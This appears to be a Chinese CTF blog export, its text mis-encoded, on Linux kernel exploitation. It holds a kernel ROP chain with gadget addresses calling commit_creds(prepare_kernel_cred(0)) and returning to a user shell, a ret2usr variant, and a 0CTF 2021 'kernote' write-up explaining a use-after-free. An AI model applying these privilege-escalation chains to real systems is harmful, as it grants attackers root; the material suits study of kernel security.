<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ # cat /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffff9129cce0 T prepare_kernel_cred</span><br><span class="line">/ # cat /proc/kallsyms | grep commit_creds</span><br><span class="line">ffffffff9129c8e0 T commit_creds</span><br><span class="line">prepare_kernel_cred - commit_creds = 0x400</span><br><span class="line"></span><br><span class="line">/ # cat /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffffa009cce0 T prepare_kernel_cred</span><br><span class="line">/ # cat /proc/kallsyms | grep commit_creds</span><br><span class="line">ffffffffa009c8e0 T commit_creds</span><br><span class="line">prepare_kernel_cred - commit_creds = 0x400</span><br></pre></td></tr></table></figure></li>
</ul>
<p>æŸ¥çœ‹å†…æ ¸å‡½æ•°çš„åç§»ï¼Œé€šè¿‡åç§»å¯ä»¥è®¡ç®—å‡º gadget çš„ä½ç½®<br>å·²çŸ¥ å‡½æ•°åç§» å‡½æ•°åœ°å€<br>    <code>vmlinux base = å‡½æ•°åœ°å€ - å‡½æ•°åç§»</code><br>å·²çŸ¥ æ— åç§» gadget åœ°å€<br><code>çœŸæ­£çš„ gadget = åŸæœ‰ gadget - åŸæœ‰ vmlinux base + çœŸå® vmlinux base</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec vmlinux</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; vmlinux = ELF(<span class="string">&quot;./vmlinux&quot;</span>)</span></span><br><span class="line">[*] &#x27;/home/embeded/Desktop/core/give_to_player/core/vmlinux&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    Version:  4.15.8</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; hex(vmlinux.sym[<span class="string">&#x27;commit_creds&#x27;</span>] - 0xffffffff81000000)</span></span><br><span class="line">&#x27;0x9c8e0&#x27;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>æ‰§è¡Œå®Œ commit_creds(prepare_kernel_cred(0)) åè¯¥æ€ä¹ˆåŠï¼Ÿ<br>  è¿”å›ç”¨æˆ·æ€è¿›è¡Œè°ƒç”¨</p>
<ul>
<li>ä¸ºä»€ä¹ˆè¦è¿”å›ç”¨æˆ·æ€<ul>
<li>å¤§éƒ¨åˆ†æœ‰ç”¨çš„ä¿¡æ¯èƒ½éƒ½åœ¨ç”¨æˆ·æ€æ›´æ˜“è·å–</li>
<li>å†…æ ¸å°ä¸å®¹æ˜“åŠåˆ°<ul>
<li>ä¿®æ”¹æ–‡ä»¶ç³»ç»Ÿ</li>
<li>åˆ›å»ºæ–°è¿›ç¨‹</li>
<li>åˆ›å»ºç½‘ç»œè¿æ¥</li>
</ul>
</li>
</ul>
</li>
<li>å¦‚ä½•è¿”å›ç”¨æˆ·æ€<br>  åˆ¤æ–­æ˜¯å¦å±äºç”¨æˆ·æ€ï¼Œä¸€èˆ¬é€šè¿‡ç‰¹æ®Šçš„å¯„å­˜å™¨æŒ‡ä»¤ <code>swapgs; iretq</code> éœ€è¦è®¾ç½® <code>cs</code> <code>rflags</code> ç­‰ä¿¡æ¯ï¼Œå‡½æ•°ä¿å­˜ <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">         <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">         <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">         <span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line">         <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">         <span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">         :<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line">         :</span><br><span class="line">         : <span class="string">&quot;memory&quot;</span></span><br><span class="line">     );</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>ç¡®è®¤ rop é“¾</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">|......| &lt;- rsp </span><br><span class="line">|......| </span><br><span class="line">|......| &lt;- rsp + 0x40</span><br><span class="line">|canary|</span><br><span class="line">|gadget 1| &lt;- ret &lt;- pop rdi, ret</span><br><span class="line">|    0   |</span><br><span class="line">|prepare_kernel_cred| -&gt; return rax</span><br><span class="line"></span><br><span class="line">|gadget 2| &lt;- mov rdi, rax, ret</span><br><span class="line">|commit_creds|</span><br><span class="line"></span><br><span class="line">|gadget 3| &lt;- swapgs; ret;</span><br><span class="line">|gadget 3| &lt;- iretq; ret;</span><br><span class="line">|shell addr|</span><br><span class="line">|cs|</span><br><span class="line">|user_rflags|</span><br><span class="line">|user_sp|</span><br><span class="line">|user_ss|</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<ol>
<li>é¦–å…ˆå¡«å……æ»¡å·²çŸ¥åŒºåŸŸï¼Œé…ç½® Canary</li>
<li>gadget 1 è°ƒç”¨ prepare_kernel_cred</li>
<li>gagdet 2 è°ƒç”¨ commit_creds</li>
<li>gadget 3 åˆ‡æ¢ç”¨æˆ·æ€</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> offset = vmlinux_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81021e53</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset;</span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset;</span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)shell;</span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h3><p>ret2usr çš„æ–¹æ³•åˆ©ç”¨ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹ä¸èƒ½è®¿é—®å†…æ ¸ç©ºé—´ï¼Œä½†å†…æ ¸ç©ºé—´èƒ½è®¿é—®ç”¨æˆ·ç©ºé—´ç‰¹æ€§ä½¿å¾—å†…æ ¸ä»£ç æˆ–è€…æ•°æ®æµå‘ç”¨æˆ·ç©ºé—´ï¼Œä»¥ ring 0 ç‰¹æƒæ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç å®Œæˆææƒ</p>
<p>ä¸ ROP çš„ä¸åŒï¼š</p>
<ol>
<li><p>ROP é€šè¿‡å†…æ ¸ ROP é“¾æ‰§è¡Œææƒï¼Œè¿”å›ç”¨æˆ·æ€åæ‰§è¡Œ systemï¼Œè·å–shell</p>
</li>
<li><p>ret2usr ç›´æ¥è¿”å›åˆ°ç”¨æˆ·ç©ºé—´æ„é€ çš„å‡½æ•°æŒ‡é’ˆæ¥å®ç°ææƒ</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getroot</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span>  (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] root now&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ROP chain</span></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> offset = vmlinux_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)getroot;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset;</span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>0CTF 2021 kernote</title>
    <url>/2022/05/06/0CTF-2021-kernote/</url>
    <content><![CDATA[<span id="more"></span>

<h3 id="ç³»ç»Ÿç¯å¢ƒ"><a href="#ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ"></a>ç³»ç»Ÿç¯å¢ƒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">è™šæ‹Ÿæœºè½¯ä»¶ï¼šVMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br></pre></td></tr></table></figure>
<p>é¢˜ç›®èµ„æºè·å–é“¾æ¥ï¼š<a href="https://github.com/Darenfy/CTF-Chanllenge/tree/main/0CTF-2021-final/kernote">https://github.com/Darenfy/CTF-Chanllenge/tree/main/0CTF-2021-final/kernote</a></p>
<h2 id="åˆ†æé¢˜ç›®"><a href="#åˆ†æé¢˜ç›®" class="headerlink" title="åˆ†æé¢˜ç›®"></a>åˆ†æé¢˜ç›®</h2><p>è·å–é¢˜ç›®è§£å‹åï¼ŒæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">bzImage  readme.md  rootfs.img  run.sh</span><br><span class="line"></span><br><span class="line">$ file *</span><br><span class="line">bzImage:    Linux kernel x86 boot executable bzImage, version 5.11.9 (yzloser@yzloser-rubbish) <span class="comment">#2 SMP Wed Sep 22 23:03:52 CST 2021, RO-rootFS, swap_dev 0x9, Normal VGA</span></span><br><span class="line">readme.md:  ASCII text</span><br><span class="line">rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=1a11479a-9bca-4c78-ae24-9c9c0b41d9f4 (extents) (64bit) (large files) (huge files)</span><br><span class="line">run.sh:     POSIX shell script, ASCII text executable</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> readme.md </span><br><span class="line">Here are some kernel config options <span class="keyword">in</span> <span class="keyword">case</span> you need it</span><br><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> run.sh </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-hda ./rootfs.img \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot;</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=2 \</span><br><span class="line">-nographic \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-no-reboot \</span><br><span class="line">-snapshot</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆå…±åŒ…æ‹¬å››ä¸ªæ–‡ä»¶</p>
<ul>
<li>bzImageï¼šå…¸å‹çš„kernelé•œåƒæ–‡ä»¶</li>
<li>rootfs.imgï¼šext4 æ–‡ä»¶ç³»ç»Ÿ</li>
<li>readme.mdï¼šæç¤ºå†…æ ¸é…ç½®ä¿¡æ¯</li>
<li>run.shï¼šQEMU è¿è¡Œè„šæœ¬</li>
</ul>
<p>æ ¹æ®ä¸Šè¿°ä¿¡æ¯å¯ä»¥çœ‹åˆ°</p>
<ul>
<li>å¸¸ç”¨å†…æ ¸é˜²æŠ¤å‡å·²å¼€å¯ï¼ˆKASLRï¼ŒSMEPï¼ŒSMAPï¼ŒKPTIï¼‰</li>
<li>ä½¿ç”¨ SLAB allocator</li>
<li>é€šè¿‡ç¡¬ç¼–ç å…³é—­ Usermode Helper</li>
<li>å¦‚æœè§¦å‘ kernel warnings æˆ– panic è™šæ‹Ÿæœºä¼šç›´æ¥å…³é—­</li>
</ul>
<h2 id="æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿ"><a href="#æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿ"></a>æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿ</h2><p><code>rootfs.img</code> æ˜¯ ext4 æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ Ubuntu ä¸Šå¯ä»¥ç›´æ¥æŒ‚è½½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> mount</span><br><span class="line">$ sudo mount -o loop rootfs.img mount</span><br><span class="line">/mount$ <span class="built_in">ls</span></span><br><span class="line">bin  dev  etc  flag  init  kernote.ko  linuxrc  lost+found  proc  sbin  sys  tmp  usr</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/release/mount$ <span class="built_in">cat</span> init </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="comment">#mount -t devtmpfs devtmpfs /dev</span></span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"><span class="built_in">echo</span> /sbin/mdev&gt;/proc/sys/kernel/hotplug</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;flag&#123;testflag&#125;&quot;</span>&gt;/flag</span><br><span class="line"><span class="built_in">chmod</span> 660 /flag</span><br><span class="line">insmod /kernote.ko</span><br><span class="line"><span class="comment">#/sbin/mdev -s</span></span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/kernote</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li><code>dmesg_restrict=1</code> æ„å‘³ç€æ— æ³•è¯»å–å†…æ ¸æ—¥å¿—</li>
<li><code>kptr_restrict=1</code> æ„å‘³ç€æ— æ³•ä» <code>/proc/kallsyms</code> è¯»å–å†…æ ¸åœ°å€<br>ğŸŒ°<img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061550746.png"></li>
</ul>
<h2 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†å¯¹å¸¦æœ‰æ¼æ´ä»£ç çš„ kernel æ¨¡å—è¿›è¡Œé€†å‘</p>
<p><strong>init and exit</strong><br>ä¸»è¦æ³¨å†Œäº†ä¸€ä¸ªå­—ç¬¦è®¾å¤‡ï¼Œå¯ä»¥é€šè¿‡ <code>/dev/kernote</code> è®¿é—®</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">kernel_module_init</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// æ³¨å†Œå­—ç¬¦è®¾å¤‡</span></span><br><span class="line">    <span class="type">int</span> result</span><br><span class="line"></span><br><span class="line">    major_num = __register_chrdev(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>, kernote_fo)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> major_num &gt;= <span class="number">0</span> <span class="comment">// å¦‚æœåˆ†é…æˆåŠŸ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// åˆ›å»ºç»“æ„ç±»æŒ‡é’ˆ</span></span><br><span class="line">        module_class = _class_create(this_module, <span class="string">&quot;kernote&quot;</span>, module_device);</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">IS_ERR</span><span class="params">(module_class)</span></span><br><span class="line">        &#123;</span><br><span class="line">            module_device = device_create(module_class, <span class="number">0</span>, (major_num&lt;&lt;<span class="number">20</span>), <span class="number">0</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> IS_ERR(module_device)</span><br><span class="line">            &#123;</span><br><span class="line">                print(<span class="string">&quot;Insert module complete&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                class_destroy(module_class)</span><br><span class="line">                _unregister_chrdev(major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">                print(<span class="string">&quot;Failed to create device&quot;</span>)</span><br><span class="line">                result = module_device</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            _unregister_chrdev(major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">            print(<span class="string">&quot;Failed to create class&quot;</span>)</span><br><span class="line">            result =  module_class</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        print(Failed to <span class="keyword">register</span> device)</span><br><span class="line">        result = major_num</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> kernel_module_exit()</span><br><span class="line">&#123;</span><br><span class="line">    print(<span class="string">&quot;Start to clean up the module&quot;</span>)</span><br><span class="line">    device_destroy(module_class, (major_num) &lt;&lt; <span class="number">20</span>)</span><br><span class="line">    class_destory(module_class)</span><br><span class="line">    _unregister_chrdev(major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;Module clean up complete&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ioctl</strong><br>è¯¥æ¨¡å—ä¸»è¦åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º 16 çš„ buf æŒ‡é’ˆæ•°ç»„æ¥è¿›è¡Œç¬”è®°çš„ç®¡ç†ï¼Œæ¯ä¸€ä¸ªæŒ‡é’ˆå¯¹åº”ä¸€ä¸ªç¬”è®°ï¼Œioctl ä¸»è¦å¯¹ç¬”è®°çš„ç®¡ç†è¿›è¡Œçš„æè¿°</p>
<ul>
<li>0x6668<br>  åˆ é™¤ç¬”è®°ï¼Œå¦‚æœé‡Šæ”¾ç¬”è®°ç´¢å¼•ä¸è¶…è¿‡16ä¸”è¯¥ç¬”è®°å·²è¢«åˆ›å»ºï¼Œåˆ™è°ƒç”¨ kfree å¯¹å…¶è¿›è¡Œé‡Šæ”¾ï¼Œå¹¶ä¸”æ¸…é™¤ç¬”è®°å†…å®¹</li>
<li>0x6666<br>  è·å–ç¬”è®°ï¼Œå¦‚æœç¬”è®°ç´¢å¼•ä¸è¶…è¿‡16ï¼Œåˆ™è·å–ç¬”è®°æŒ‡é’ˆ</li>
<li>0x6667<br>  åˆ›å»ºç¬”è®°ï¼Œå¦‚æœç¬”è®°ç´¢å¼•ä¸è¶…è¿‡16ï¼Œåˆ™è°ƒç”¨ kmalloc åˆ›å»º 8 å­—èŠ‚å†…å®¹ï¼Œåˆ†é…ç»™æŒ‡é’ˆæ•°ç»„</li>
<li>0x6669<br>  å†™ç¬”è®°ï¼Œå¦‚æœç¬”è®°æŒ‡é’ˆå­˜åœ¨ï¼Œåˆ™å°†ç¬”è®°å†…å®¹å†™å…¥å†…å­˜</li>
<li>0x666a<br>  å±•ç¤ºç¬”è®°ï¼Œåªæœ‰ root ç”¨æˆ·æ‰èƒ½æŸ¥çœ‹ç¬”è®°å†…å®¹<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> major_num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">module_class</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">module_device</span>;</span></span><br><span class="line"><span class="type">spinlock_t</span> spin;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kernote_ioctl</span><span class="params">(<span class="keyword">struct</span> file *f , uint cmd, uint args)</span></span><br><span class="line">&#123;</span><br><span class="line">    raw_spin_lock(&amp;spin)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6668</span>: <span class="comment">// delete</span></span><br><span class="line">            <span class="keyword">if</span> arg &gt; <span class="number">15</span> || <span class="literal">NULL</span> = buf[arg]:</span><br><span class="line">                ret = <span class="number">-1</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            kfree(buf[arg])</span><br><span class="line">            buf[arg] = <span class="number">0</span>;</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6666</span>: <span class="comment">// fetch</span></span><br><span class="line">            ret = <span class="number">-1</span></span><br><span class="line">            <span class="keyword">if</span> arg &gt; <span class="number">15</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            note = buf[arg]</span><br><span class="line">            ret = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6667</span>: <span class="comment">// alloc</span></span><br><span class="line">            <span class="keyword">if</span> arg &gt; <span class="number">15</span>:</span><br><span class="line">                ret = <span class="number">-1</span></span><br><span class="line">            </span><br><span class="line">            uint64 *newnote = kmalloc(<span class="number">8</span>, GFP_KERNEL)</span><br><span class="line">            buf[arg] = newnote</span><br><span class="line">            ret = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6669</span>: <span class="comment">// write</span></span><br><span class="line">            <span class="keyword">if</span> (note) &#123;</span><br><span class="line">                *note = arg</span><br><span class="line">                ret = <span class="number">0</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret = <span class="number">-1</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x666A</span>: <span class="comment">// inc_refcount? æ‰“å°ä¿¡æ¯</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> current_task-&gt;cred-&gt;user</span><br><span class="line">            <span class="title function_">refcount_inc</span><span class="params">(&amp;user-&gt;__count)</span></span><br><span class="line">            <span class="title function_">if</span> <span class="params">(user-&gt;uid != <span class="number">0</span>)</span></span><br><span class="line">                <span class="title function_">print</span><span class="params">(<span class="string">&quot;******&quot;</span>)</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> note != <span class="literal">NULL</span></span><br><span class="line">                <span class="title function_">print</span><span class="params">(<span class="string">&quot;0x%lx&quot;</span>, *note)</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="title function_">print</span><span class="params">(<span class="string">&quot;No note&quot;</span>)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">spin_unlock</span><span class="params">(&amp;spin)</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="æ¼æ´åˆ†æåŠæ„å»º"><a href="#æ¼æ´åˆ†æåŠæ„å»º" class="headerlink" title="æ¼æ´åˆ†æåŠæ„å»º"></a>æ¼æ´åˆ†æåŠæ„å»º</h2></li>
</ul>
<p><strong>æ¼æ´æˆå› </strong><br>é¦–å…ˆåˆ›å»ºç¬”è®°å¹¶å°†æŒ‡é’ˆå­˜å…¥ bufï¼Œè¿™æ—¶åº”å½“æ³¨æ„å†…æ ¸ä½¿ç”¨ SLAB åˆ†é…å™¨<br>æºç å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ° kmalloc çš„æœ€å°åˆ†é…å°ºå¯¸æ˜¯ 100000ï¼ˆæ¯”ç‰¹ä½ï¼‰å³ 32 å­—èŠ‚ï¼Œå› æ­¤è™½ç„¶ä»£ç ä¸­è¦æ±‚åˆ›å»º 8 å­—èŠ‚å†…å­˜ç©ºé—´ï¼Œä½†æ˜¯åœ¨å†…æ ¸ä¸­åˆ†é…äº†32 å­—èŠ‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW	5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>ç„¶åè·å–ç¬”è®°ï¼Œè¿™ä¼šä½¿ç¬”è®°æŒ‡é’ˆå­˜å…¥ note å˜é‡ï¼Œ<br>éšåå¯¹ç¬”è®°è¿›è¡Œåˆ é™¤ï¼Œä¼šç¬”è®°å¯¹åº”çš„å†…å­˜é‡Šæ”¾ï¼Œå¹¶æŠŠ buf æŒ‡é’ˆæ•°ç»„çš„å†…å®¹æ¸…é›¶ï¼Œä½†æ˜¯ç›®å‰ note å˜é‡é‡Œä»æ—§å­˜æ”¾ç€å†…å­˜æŒ‡é’ˆ<br>æœ€åå†™ç¬”è®°ï¼Œé€šè¿‡ note å˜é‡ä»ç„¶å¯ä»¥å¯¹å·²é‡Šæ”¾å†…å­˜è¿›è¡Œå†™æ“ä½œï¼Œä»è€Œæ„æˆ use-after-free</p>
<p><strong>poc</strong></p>
